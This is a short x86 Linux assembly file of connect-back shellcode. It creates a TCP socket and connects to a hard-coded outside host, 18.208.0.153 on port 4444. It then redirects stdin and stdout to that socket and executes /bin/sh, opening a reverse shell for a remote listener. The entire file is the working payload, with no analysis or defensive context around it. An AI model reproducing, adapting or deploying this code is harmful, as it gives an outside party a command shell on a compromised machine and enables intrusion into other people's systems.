#define SYS_SOCKET	1		// /* sys_socket(2)		*/
#define SYS_BIND	2		// /* sys_bind(2)			*/
#define SYS_CONNECT	3		// /* sys_connect(2)		*/


#define	PF_INET		2
#define SOCK_STREAM     1

#include <asm/unistd.h>


cb:
        // socket(PF_INET, SOCK_STREAM, 0)
        subl    $-200, %esp
        xorl    %eax, %eax
        pushl   %eax            // 0
        xorl    %ebx, %ebx
        movb    $0x01, %bl
        pushl   %ebx            // SOCK_STREAM (0x01)
        pushl   $PF_INET
        movb    $0x66, %al
        // %ebx is 0x01, which is also SYS_SOCKET
        movl    %esp, %ecx
        int     $0x80

        // connect(fd, 18.208.0.153:4444)
        // Push a sockaddr_in onto the stack
        // The IP
        pushl   $0x9900d012
        // the port and the address family (AF_INET, 0x02)
        pushw   $0x5c11
        pushw   $0x02
        movl    %esp, %ecx
        // socklen_t addrlen
        pushl   $0x10
        // struct sockaddr *serv_addr
        pushl   %ecx
        // int sockfd
        pushl   %eax
        xorl    %eax, %eax
        movb    $0x66, %al
        movb    $0x03, %bl
        movl    %esp, %ecx
        int     $0x80

        // dup2(fd, 1)
        popl    %ebx
        xorl    %ecx, %ecx
        movb    $__NR_dup2, %al
        int     $0x80
        // dup2(fd, 0)
        incl    %ecx
        movb    $__NR_dup2, %al
        int     $0x80

        // exec("/bin/sh")
        movl $0x68732fAA,%eax
        shr $8,%eax
        pushl %eax
        pushl $0x6e69622f

        movl  %esp, %ebx

        xorl %edx, %edx
        pushl %edx
        pushl %ebx
        movl  %esp, %ecx

        movl %edx, %eax
        addb $0x0b, %al

        int $0x80

        .globl endcb
endcb:
